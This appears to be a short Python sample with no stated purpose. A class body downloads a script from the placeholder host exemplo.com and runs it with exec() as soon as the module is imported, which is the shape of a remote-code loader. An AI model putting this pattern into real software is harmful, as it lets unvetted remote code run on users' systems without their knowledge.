import requests


class C:
    dados = requests.get("http://exemplo.com/script.py")
    exec(dados.text)
